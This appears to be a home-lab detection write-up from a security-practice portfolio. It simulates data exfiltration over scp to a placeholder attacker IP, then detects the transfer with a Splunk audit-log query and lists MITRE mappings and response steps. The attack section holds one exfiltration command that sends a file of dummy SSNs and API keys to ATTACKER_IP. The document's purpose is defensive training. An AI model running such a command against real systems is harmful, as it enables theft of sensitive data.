# Scenario 07: Data Exfiltration Detection

**Date:** 2026-03-18
**MITRE ATT&CK:** T1041 — Exfiltration Over C2 Channel
**Severity:** Critical

## Lab Setup
- Attacker: Kali Linux (ATTACKER_IP)
- Victim: Ubuntu Server (VICTIM_IP)
- SIEM: Splunk Enterprise (Free)

## Attack Executed
```bash
# Step 1: Create sensitive file on victim machine
cat > ~/sensitive.txt << 'EOF'
CONFIDENTIAL - INTERNAL USE ONLY
Employee Records:
John Doe - SSN: 123-45-6789
API Key: sk-1234567890abcdef
EOF

# Step 2: Exfiltrate file to attacker machine
scp ~/sensitive.txt nebula-kl@ATTACKER_IP:/home/nebula-kl/
```

## Why Attackers Do This
- Steal credentials, PII, intellectual property
- Exfiltrate database dumps
- Transfer tools and malware
- SCP is stealthy — uses legitimate SSH port 22

## Detection SPL Query
```splunk
index=main sourcetype=linux_audit
| search "scp" OR "sftp" OR "rsync"
| rename comm AS cmd
| table _time, host, cmd, exe, uid
| sort -_time
```

## Findings
- 15 events captured during SCP exfiltration
- Auditd captured scp process execution
- File transfer to external IP detected

## MITRE ATT&CK Mapping
- Tactic: Exfiltration
- Technique: T1041 — Exfiltration Over C2 Channel
- Technique: T1048 — Exfiltration Over Alternative Protocol

## Screenshot
![Data Exfiltration Detection](../../screenshots/07-data-exfiltration.png)

## Response Steps
1. Identify what data was exfiltrated
2. Block destination IP immediately
3. Check how attacker gained access to sensitive file
4. Review all scp/sftp activity from same user
5. Notify data protection officer — possible GDPR breach
6. Investigate if other files were exfiltrated
EOF
